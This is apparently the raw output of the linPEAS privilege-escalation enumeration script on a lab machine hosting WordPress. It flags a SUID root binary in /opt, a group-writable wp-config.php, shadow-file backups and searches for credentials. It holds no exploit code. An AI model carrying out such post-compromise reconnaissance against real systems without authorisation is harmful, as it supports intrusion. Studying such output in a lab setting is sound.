/var/www/html/h3l105/wp-admin/css/colors/ectoplasm/colors-rtl.min.css
/var/www/html/h3l105/wp-admin/css/colors/ectoplasm/colors.css
/var/www/html/h3l105/wp-admin/css/colors/ectoplasm/colors.min.css
/var/www/html/h3l105/wp-admin/css/colors/ectoplasm/colors.scss
/var/www/html/h3l105/wp-admin/css/colors/light
/var/www/html/h3l105/wp-admin/css/colors/light/colors-rtl.css
/var/www/html/h3l105/wp-admin/css/colors/light/colors-rtl.min.css
/var/www/html/h3l105/wp-admin/css/colors/light/colors.css
/var/www/html/h3l105/wp-admin/css/colors/light/colors.min.css
/var/www/html/h3l105/wp-admin/css/colors/light/colors.scss
/var/www/html/h3l105/wp-admin/css/colors/midnight
/var/www/html/h3l105/wp-admin/css/colors/midnight/colors-rtl.css
/var/www/html/h3l105/wp-admin/css/colors/midnight/colors-rtl.min.css
/var/www/html/h3l105/wp-admin/css/colors/midnight/colors.css
/var/www/html/h3l105/wp-admin/css/colors/midnight/colors.min.css
/var/www/html/h3l105/wp-admin/css/colors/midnight/colors.scss
/var/www/html/h3l105/wp-admin/css/colors/ocean
/var/www/html/h3l105/wp-admin/css/colors/ocean/colors-rtl.css
/var/www/html/h3l105/wp-admin/css/colors/ocean/colors-rtl.min.css
/var/www/html/h3l105/wp-admin/css/colors/ocean/colors.css
/var/www/html/h3l105/wp-admin/css/colors/ocean/colors.min.css
/var/www/html/h3l105/wp-admin/css/colors/ocean/colors.scss
/var/www/html/h3l105/wp-admin/css/colors/sunrise
/var/www/html/h3l105/wp-admin/css/colors/sunrise/colors-rtl.css
/var/www/html/h3l105/wp-admin/css/colors/sunrise/colors-rtl.min.css
/var/www/html/h3l105/wp-admin/css/colors/sunrise/colors.css
/var/www/html/h3l105/wp-admin/css/colors/sunrise/colors.min.css
/var/www/html/h3l105/wp-admin/css/colors/sunrise/colors.scss
/var/www/html/h3l105/wp-admin/css/common-rtl.css
/var/www/html/h3l105/wp-admin/css/common-rtl.min.css
/var/www/html/h3l105/wp-admin/css/common.css
/var/www/html/h3l105/wp-admin/css/common.min.css
/var/www/html/h3l105/wp-admin/css/customize-controls-rtl.css
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/custom-background.php
/var/www/html/h3l105/wp-admin/custom-header.php
/var/www/html/h3l105/wp-admin/customize.php
/var/www/html/h3l105/wp-admin/edit-comments.php
/var/www/html/h3l105/wp-admin/edit-form-advanced.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/includes/admin-filters.php
/var/www/html/h3l105/wp-admin/includes/admin.php
/var/www/html/h3l105/wp-admin/includes/ajax-actions.php
/var/www/html/h3l105/wp-admin/includes/bookmark.php
/var/www/html/h3l105/wp-admin/includes/class-automatic-upgrader-skin.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/index.php
/var/www/html/h3l105/wp-admin/install-helper.php
/var/www/html/h3l105/wp-admin/install.php
/var/www/html/h3l105/wp-admin/js
/var/www/html/h3l105/wp-admin/js/accordion.js
/var/www/html/h3l105/wp-admin/js/accordion.min.js
/var/www/html/h3l105/wp-admin/js/code-editor.js
/var/www/html/h3l105/wp-admin/js/code-editor.min.js
/var/www/html/h3l105/wp-admin/js/color-picker.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/js/widgets/custom-html-widgets.js
/var/www/html/h3l105/wp-admin/js/widgets/custom-html-widgets.min.js
/var/www/html/h3l105/wp-admin/js/widgets/media-audio-widget.js
/var/www/html/h3l105/wp-admin/js/widgets/media-audio-widget.min.js
/var/www/html/h3l105/wp-admin/js/widgets/media-gallery-widget.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/js/word-count.js
/var/www/html/h3l105/wp-admin/js/word-count.min.js
/var/www/html/h3l105/wp-admin/js/wp-fullscreen-stub.js
/var/www/html/h3l105/wp-admin/js/wp-fullscreen-stub.min.js
/var/www/html/h3l105/wp-admin/js/xfn.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/link-add.php
/var/www/html/h3l105/wp-admin/link-manager.php
/var/www/html/h3l105/wp-admin/link-parse-opml.php
/var/www/html/h3l105/wp-admin/link.php
/var/www/html/h3l105/wp-admin/load-scripts.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/maint/repair.php
/var/www/html/h3l105/wp-admin/media-new.php
/var/www/html/h3l105/wp-admin/media-upload.php
/var/www/html/h3l105/wp-admin/media.php
/var/www/html/h3l105/wp-admin/menu-header.php
/var/www/html/h3l105/wp-admin/menu.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/network/about.php
/var/www/html/h3l105/wp-admin/network/admin.php
/var/www/html/h3l105/wp-admin/network/credits.php
/var/www/html/h3l105/wp-admin/network/edit.php
/var/www/html/h3l105/wp-admin/network/freedoms.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/options-discussion.php
/var/www/html/h3l105/wp-admin/options-general.php
/var/www/html/h3l105/wp-admin/options-head.php
/var/www/html/h3l105/wp-admin/options-media.php
/var/www/html/h3l105/wp-admin/options-permalink.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/user/about.php
/var/www/html/h3l105/wp-admin/user/admin.php
/var/www/html/h3l105/wp-admin/user/credits.php
/var/www/html/h3l105/wp-admin/user/freedoms.php
/var/www/html/h3l105/wp-admin/user/index.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/users.php
/var/www/html/h3l105/wp-admin/widgets.php
/var/www/html/h3l105/wp-blog-header.php
/var/www/html/h3l105/wp-comments-post.php
/var/www/html/h3l105/wp-config-sample.php
/var/www/html/h3l105/wp-config.php
/var/www/html/h3l105/wp-content
/var/www/html/h3l105/wp-content/index.php
/var/www/html/h3l105/wp-content/plugins
/var/www/html/h3l105/wp-content/plugins/akismet
/var/www/html/h3l105/wp-content/plugins/akismet/.htaccess
/var/www/html/h3l105/wp-content/plugins/akismet/LICENSE.txt
/var/www/html/h3l105/wp-content/plugins/akismet/_inc
/var/www/html/h3l105/wp-content/plugins/akismet/_inc/akismet.css
/var/www/html/h3l105/wp-content/plugins/akismet/_inc/akismet.js
/var/www/html/h3l105/wp-content/plugins/akismet/_inc/form.js
/var/www/html/h3l105/wp-content/plugins/akismet/_inc/img
/var/www/html/h3l105/wp-content/plugins/akismet/akismet.php
/var/www/html/h3l105/wp-content/plugins/akismet/class.akismet-admin.php
/var/www/html/h3l105/wp-content/plugins/akismet/class.akismet-cli.php
/var/www/html/h3l105/wp-content/plugins/akismet/class.akismet-rest-api.php
/var/www/html/h3l105/wp-content/plugins/akismet/class.akismet-widget.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-content/plugins/akismet/views/config.php
/var/www/html/h3l105/wp-content/plugins/akismet/views/get.php
/var/www/html/h3l105/wp-content/plugins/akismet/views/notice.php
/var/www/html/h3l105/wp-content/plugins/akismet/views/start.php
/var/www/html/h3l105/wp-content/plugins/akismet/views/stats.php
/var/www/html/h3l105/wp-content/plugins/akismet/wrapper.php
/var/www/html/h3l105/wp-content/plugins/hello.php
/var/www/html/h3l105/wp-content/plugins/index.php
/var/www/html/h3l105/wp-content/plugins/mail-masta
/var/www/html/h3l105/wp-content/plugins/mail-masta/amazon_api
/var/www/html/h3l105/wp-content/plugins/mail-masta/amazon_api/SimpleEmailService.php
/var/www/html/h3l105/wp-content/plugins/mail-masta/amazon_api/SimpleEmailServiceMessage.php
/var/www/html/h3l105/wp-content/plugins/mail-masta/amazon_api/SimpleEmailServiceRequest.php
/var/www/html/h3l105/wp-content/plugins/mail-masta/inc
/var/www/html/h3l105/wp-content/plugins/mail-masta/inc/ajax_listing.php

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                          
  Group helios:                                                                                                                           
/var/www/html/h3l105/wp-config.php                                                                                                        



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                       
                            ╚═════════════════════════╝                                                                                   
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                  
/usr/bin/gettext.sh                                                                                                                       

╔══════════╣ Executable files potentially added by user (limit 70)
2025-05-28+16:06:43.7559391060 /tmp/linpeas.sh                                                                                            
2019-06-28+20:21:27.5273399290 /opt/statuscheck
2019-06-28+19:46:49.5241496940 /var/www/html/h3l105/wp-content/plugins/mail-masta/amazon_api/SimpleEmailServiceRequest.php
2019-06-28+19:46:49.5241496940 /var/www/html/h3l105/wp-content/plugins/mail-masta/amazon_api/SimpleEmailServiceMessage.php
2019-06-28+19:46:49.5201496870 /var/www/html/h3l105/wp-content/plugins/mail-masta/amazon_api/SimpleEmailService.php
2019-06-28+19:46:49.5161496820 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/jquery-ui-timepicker-addon.js
2019-06-28+19:46:49.5121496760 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/jquery.min.js
2019-06-28+19:46:49.5081496700 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/subscriber.js
2019-06-28+19:46:49.5001496580 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js
2019-06-28+19:46:49.4881496390 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/bootstrap.js
2019-06-28+19:46:49.4841496330 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/validation.js
2019-06-28+19:46:49.4841496330 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/jquery.selectbox-0.2.min.js
2019-06-28+19:46:49.4801496270 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/font-awesome.min.css
2019-06-28+19:46:49.4801496270 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/Chart.js
2019-06-28+19:46:49.4761496210 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/validationEngine.jquery.css
2019-06-28+19:46:49.4761496210 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/jquery-ui.css
2019-06-28+19:46:49.4721496150 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/b-9-2.png
2019-06-28+19:46:49.4681496090 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/2.png
2019-06-28+19:46:49.4601495970 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/iam-create-mailmasta-user.jpg
2019-06-28+19:46:49.4601495970 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/green_check.jpeg
2019-06-28+19:46:49.4521495840 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/9-2.png
2019-06-28+19:46:49.4481495780 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/select-icons.png
2019-06-28+19:46:49.4481495780 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/b-3.png
2019-06-28+19:46:49.4441495720 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/unnamed.jpg
2019-06-28+19:46:49.4361495600 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/5.png
2019-06-28+19:46:49.4321495540 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/mailmasta-finalmail.png
2019-06-28+19:46:49.4241495420 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/b-9.png
2019-06-28+19:46:49.4201495350 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/report-icon.png
2019-06-28+19:46:49.4201495350 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/calendar.png
2019-06-28+19:46:49.4161495300 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/view-icon.png
2019-06-28+19:46:49.4161495300 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/9.png
2019-06-28+19:46:49.4121495240 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/verified-senders.jpg
2019-06-28+19:46:49.4121495240 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/select-icons_new.png
2019-06-28+19:46:49.4121495240 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/loading.gif
2019-06-28+19:46:49.4081495180 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/b-4.png
2019-06-28+19:46:49.4041495120 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/iam-create-mailmasta-user (1).jpg
2019-06-28+19:46:49.3881494860 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/3.png
2019-06-28+19:46:49.3841494810 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/b-5.png
2019-06-28+19:46:49.3761494690 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/images/4.png
2019-06-28+19:46:49.3721494630 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/mm_frontend.css
2019-06-28+19:46:49.3721494630 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/mail-masta.css
2019-06-28+19:46:49.3681494570 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/jquery.selectbox.css
2019-06-28+19:46:49.3681494570 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/jquery.datetimepicker.css
2019-06-28+19:46:49.3681494570 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/css/bootstrap.css
2019-06-28+19:46:49.3641494510 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/readme.md
2019-06-28+19:46:49.3601494450 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/bootstrap-timepicker.js
2019-06-28+19:46:49.3481494260 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/jquery-ui.js
2019-06-28+19:46:49.3361494080 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/fonts/FontAwesome.otf
2019-06-28+19:46:49.3321494020 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/fonts/fontawesome-webfont.woff
2019-06-28+19:46:49.3321494020 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/fonts/fontawesome-webfont.ttf
2019-06-28+19:46:49.3281493960 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/fonts/fontawesome-webfont.svg
2019-06-28+19:46:49.3281493960 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/fonts/fontawesome-webfont.eot
2019-06-28+19:46:49.3201493830 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/subscriber1.js
2019-06-28+19:46:49.3201493830 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/LICENSE.md
2019-06-28+19:46:49.3201493830 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/Chart.min.js
2019-06-28+19:46:49.3161493770 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js
2019-06-28+19:46:49.3161493770 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/custom.js
2019-06-28+19:46:49.3161493770 /var/www/html/h3l105/wp-content/plugins/mail-masta/lib/component.json
2019-06-28+19:46:49.3081493650 /var/www/html/h3l105/wp-content/plugins/mail-masta/inc/mail-license-data.php
2019-06-28+19:46:49.3041493590 /var/www/html/h3l105/wp-content/plugins/mail-masta/inc/mail-masta-delete.php
2019-06-28+19:46:49.3041493590 /var/www/html/h3l105/wp-content/plugins/mail-masta/inc/campaign_save.php
2019-06-28+19:46:49.3001493530 /var/www/html/h3l105/wp-content/plugins/mail-masta/inc/mail-settings-data.php
2019-06-28+19:46:49.3001493530 /var/www/html/h3l105/wp-content/plugins/mail-masta/inc/mail-list-data.php
2019-06-28+19:46:49.2961493470 /var/www/html/h3l105/wp-content/plugins/mail-masta/inc/subscriber_list.php
2019-06-28+19:46:49.2881493350 /var/www/html/h3l105/wp-content/plugins/mail-masta/inc/form_listing.php
2019-06-28+19:46:49.2841493290 /var/www/html/h3l105/wp-content/plugins/mail-masta/inc/mail-autoresponder-data.php
2019-06-28+19:46:49.2761493170 /var/www/html/h3l105/wp-content/plugins/mail-masta/inc/mail-masta-lists.php
2019-06-28+19:46:49.2721493110 /var/www/html/h3l105/wp-content/plugins/mail-masta/inc/masta_license.php
2019-06-28+19:46:49.2721493110 /var/www/html/h3l105/wp-content/plugins/mail-masta/inc/campaign_delete.php
2019-06-28+19:46:49.2721493110 /var/www/html/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php

╔══════════╣ Unexpected in /opt (usually empty)
total 20                                                                                                                                  
drwxr-xr-x  2 root root 4096 Jun 28  2019 .
drwxr-xr-x 22 root root 4096 Jun 28  2019 ..
-rwsr-xr-x  1 root root 8640 Jun 28  2019 statuscheck

╔══════════╣ Unexpected in root
/initrd.img                                                                                                                               
/vmlinuz.old
/vmlinuz
/initrd.img.old

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/messages                                                                                                                         
/var/log/syslog
/var/log/kern.log
/var/log/auth.log
/var/log/daemon.log
/var/cache/samba/browse.dat
/etc/resolv.conf
/home/helios/.gnupg/pubring.kbx
/home/helios/.gnupg/trustdb.gpg

logrotate 3.11.0

╔══════════╣ Files inside /home/helios (limit 20)
total 28                                                                                                                                  
drwxr-xr-x 4 helios helios 4096 May 28 16:07 .
drwxr-xr-x 3 root   root   4096 Jun 28  2019 ..
lrwxrwxrwx 1 root   root      9 Jun 28  2019 .bash_history -> /dev/null
-rw-r--r-- 1 helios helios  220 Jun 28  2019 .bash_logout
-rw-r--r-- 1 helios helios 3526 Jun 28  2019 .bashrc
drwx------ 3 helios helios 4096 May 28 16:07 .gnupg
-rw-r--r-- 1 helios helios  675 Jun 28  2019 .profile
drwxr-xr-x 2 helios helios 4096 Jun 28  2019 share

╔══════════╣ Files inside others home (limit 20)
/var/www/html/image.jpg                                                                                                                   
/var/www/html/index.html
/var/www/html/h3l105/wp-login.php
/var/www/html/h3l105/readme.html
/var/www/html/h3l105/wp-settings.php
/var/www/html/h3l105/wp-comments-post.php
/var/www/html/h3l105/wp-signup.php
/var/www/html/h3l105/xmlrpc.php
/var/www/html/h3l105/wp-content/uploads/siteeditor/sed_general_date_archive.css
/var/www/html/h3l105/wp-content/uploads/siteeditor/sed_post1.css
/var/www/html/h3l105/wp-content/uploads/siteeditor/sed_general_home.css
/var/www/html/h3l105/wp-content/uploads/siteeditor/sed_general_author.css
/var/www/html/h3l105/wp-content/uploads/2019/06/image.png
/var/www/html/h3l105/wp-content/uploads/2019/06/image-1.png
/var/www/html/h3l105/wp-content/uploads/2019/06/maxresdefault.jpg
/var/www/html/h3l105/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js
/var/www/html/h3l105/wp-content/plugins/mail-masta/lib/subscriber.js
/var/www/html/h3l105/wp-content/plugins/mail-masta/lib/jquery-ui.js
/var/www/html/h3l105/wp-content/plugins/mail-masta/lib/custom.js
/var/www/html/h3l105/wp-content/plugins/mail-masta/lib/bootstrap.js
grep: write error: Broken pipe

╔══════════╣ Searching installed mail applications
postfix                                                                                                                                   
postfix-add-filter
postfix-add-policy
sendmail

╔══════════╣ Mails (limit 50)
   265067      8 -rw-------   1 helios   mail         4445 May 27 11:10 /var/mail/helios                                                  
   265067      8 -rw-------   1 helios   mail         4445 May 27 11:10 /var/spool/mail/helios

╔══════════╣ Backup folders
drwxr-xr-x 2 root root 4096 May 22 06:25 /var/backups                                                                                     
total 520
-rw-r--r-- 1 root root    51200 May 22 06:25 alternatives.tar.0
-rw-r--r-- 1 root root    13873 Jun 28  2019 apt.extended_states.0
-rw-r--r-- 1 root root      280 Jun 28  2019 dpkg.diversions.0
-rw-r--r-- 1 root root      343 Jun 28  2019 dpkg.statoverride.0
-rw-r--r-- 1 root root   434431 Jun 28  2019 dpkg.status.0
-rw------- 1 root root      789 Jun 28  2019 group.bak
-rw------- 1 root shadow    665 Jun 28  2019 gshadow.bak
-rw------- 1 root root     1534 Jun 28  2019 passwd.bak
-rw------- 1 root shadow   1021 Jun 28  2019 shadow.bak


╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 root root 21282 Apr 16  2019 /usr/bin/wsrep_sst_xtrabackup                                                                   
-rwxr-xr-x 1 root root 14328 Oct  9  2016 /usr/bin/tdbbackup.tdbtools
-rwxr-xr-x 1 root root 40835 Apr 16  2019 /usr/bin/wsrep_sst_xtrabackup-v2
-rwxr-xr-x 1 root root 18156392 Apr 16  2019 /usr/bin/mariabackup
-rwxr-xr-x 1 root root 35324 Apr 16  2019 /usr/bin/wsrep_sst_mariabackup
-rw-r--r-- 1 root root 331845 Mar 13  2017 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 303 May 15  2018 /usr/share/doc/hdparm/changelog.old.gz
-rw-r--r-- 1 root root 351 Apr 16  2019 /usr/share/man/man1/wsrep_sst_xtrabackup.1.gz
-rw-r--r-- 1 root root 348 Apr 16  2019 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz
-rw-r--r-- 1 root root 357 Apr 16  2019 /usr/share/man/man1/wsrep_sst_xtrabackup-v2.1.gz
-rw-r--r-- 1 root root 1624 Oct  9  2016 /usr/share/man/man8/tdbbackup.tdbtools.8.gz
-rw-r--r-- 1 root root 7896 Jun 16  2019 /lib/modules/4.9.0-9-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 128 Jun 28  2019 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 673 Jun 28  2019 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 Jun 28  2019 /etc/xml/catalog.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /etc/aliases.db: Berkeley DB (Hash, version 9, native byte-order)                                                                   
Found /var/lib/postfix/smtp_scache.db: regular file, no read permission
Found /var/lib/postfix/smtpd_scache.db: regular file, no read permission
Found /var/www/html/h3l105/wp-content/plugins/site-editor/editor/assets/images/Thumbs.db: Composite Document File V2 Document, Cannot read section info


╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                
total 12K
drwxr-xr-x  3 root   root   4.0K Jun 28  2019 .
drwxr-xr-x 12 root   root   4.0K Jun 28  2019 ..
drwxr-xr-x  3 helios helios 4.0K Jun 28  2019 html

/var/www/html:
total 116K
drwxr-xr-x 3 helios helios 4.0K Jun 28  2019 .
drwxr-xr-x 3 root   root   4.0K Jun 28  2019 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 helios helios 456 Jun 28  2019 /var/www/html/h3l105/wp-content/plugins/site-editor/framework/assets/less/siteeditor/bootstrap/.csslintrc
-rw-r--r-- 1 helios helios 8099 Jun 28  2019 /var/www/html/h3l105/wp-content/plugins/site-editor/framework/assets/less/siteeditor/bootstrap/.csscomb.json
-rw-r--r-- 1 helios helios 629 Jun 28  2019 /var/www/html/h3l105/wp-content/plugins/akismet/.htaccess
-rw-r--r-- 1 helios helios 249 Jun 28  2019 /var/www/html/h3l105/.htaccess
-rw------- 1 root root 0 Jun 28  2019 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 May 15  2017 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 0 May 28 14:28 /run/network/.ifstate.lock
-rw-r--r-- 1 helios helios 220 Jun 28  2019 /home/helios/.bash_logout

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwx------ 1 helios helios 840139 May 28 16:06 /tmp/linpeas.sh                                                                            
-rw-r--r-- 1 root root 51200 May 22 06:25 /var/backups/alternatives.tar.0

╔══════════╣ Searching passwords in history files
                                                                                                                                          
╔══════════╣ Searching passwords in config PHP files
/var/www/html/h3l105/wp-admin/setup-config.php:         $pwd    = trim( wp_unslash( $_POST['pwd'] ) );                                    

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                 
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python2.7/dist-packages/samba/credentials.x86_64-linux-gnu.so
/usr/lib/python2.7/dist-packages/samba/tests/credentials.py
/usr/lib/python2.7/dist-packages/samba/tests/credentials.pyc
/usr/lib/python2.7/dist-packages/samba/tests/samba_tool/user_check_password_script.py
/usr/lib/python2.7/dist-packages/samba/tests/samba_tool/user_check_password_script.pyc
/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0
/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0.0.1
/usr/lib/x86_64-linux-gnu/mariadb18/plugin/mysql_clear_password.so
/usr/lib/x86_64-linux-gnu/mariadb18/plugin/simple_password_check.so
/usr/lib/x86_64-linux-gnu/samba/ldb/local_password.so
/usr/lib/x86_64-linux-gnu/samba/ldb/password_hash.so
/usr/lib/x86_64-linux-gnu/samba/libcmdline-credentials.so.0
/usr/share/doc/apache2-doc/manual/da/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/de/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/en/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/es/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/fr/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/ja/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/ko/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/pt-br/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/tr/misc/password_encryptions.html
/usr/share/doc/apache2-doc/manual/zh-cn/misc/password_encryptions.html
/usr/share/man/man1/systemd-ask-password.1.gz
/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man7/credentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password
/var/www/html/h3l105/wp-admin/js/password-strength-meter.js
/var/www/html/h3l105/wp-admin/js/password-strength-meter.min.js

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                          
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                          
╔══════════╣ Searching passwords inside logs (limit 70)
/var/log/dpkg.log:2019-06-29 00:26:31 configure base-passwd:amd64 3.5.43 3.5.43                                                           
/var/log/dpkg.log:2019-06-29 00:26:31 install base-passwd:amd64 <none> 3.5.43
/var/log/dpkg.log:2019-06-29 00:26:31 status half-configured base-passwd:amd64 3.5.43
/var/log/dpkg.log:2019-06-29 00:26:31 status half-installed base-passwd:amd64 3.5.43
/var/log/dpkg.log:2019-06-29 00:26:31 status installed base-passwd:amd64 3.5.43
/var/log/dpkg.log:2019-06-29 00:26:31 status unpacked base-passwd:amd64 3.5.43
/var/log/dpkg.log:2019-06-29 00:26:35 status half-configured base-passwd:amd64 3.5.43
/var/log/dpkg.log:2019-06-29 00:26:35 status half-installed base-passwd:amd64 3.5.43
/var/log/dpkg.log:2019-06-29 00:26:35 status unpacked base-passwd:amd64 3.5.43
/var/log/dpkg.log:2019-06-29 00:26:35 upgrade base-passwd:amd64 3.5.43 3.5.43
/var/log/dpkg.log:2019-06-29 00:26:37 install passwd:amd64 <none> 1:4.4-4.1
/var/log/dpkg.log:2019-06-29 00:26:37 status half-installed passwd:amd64 1:4.4-4.1
/var/log/dpkg.log:2019-06-29 00:26:38 status unpacked passwd:amd64 1:4.4-4.1
/var/log/dpkg.log:2019-06-29 00:26:39 configure base-passwd:amd64 3.5.43 <none>
/var/log/dpkg.log:2019-06-29 00:26:39 status half-configured base-passwd:amd64 3.5.43
/var/log/dpkg.log:2019-06-29 00:26:39 status installed base-passwd:amd64 3.5.43
/var/log/dpkg.log:2019-06-29 00:26:39 status unpacked base-passwd:amd64 3.5.43
/var/log/dpkg.log:2019-06-29 00:26:40 configure passwd:amd64 1:4.4-4.1 <none>
/var/log/dpkg.log:2019-06-29 00:26:40 status half-configured passwd:amd64 1:4.4-4.1
/var/log/dpkg.log:2019-06-29 00:26:40 status installed passwd:amd64 1:4.4-4.1
/var/log/dpkg.log:2019-06-29 00:26:40 status unpacked passwd:amd64 1:4.4-4.1
/var/log/installer/status:Description: Set up users and passwords



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                        
                                ╚════════════════╝                                                                                        
Regexes to search for API keys aren't activated, use param '-r'
```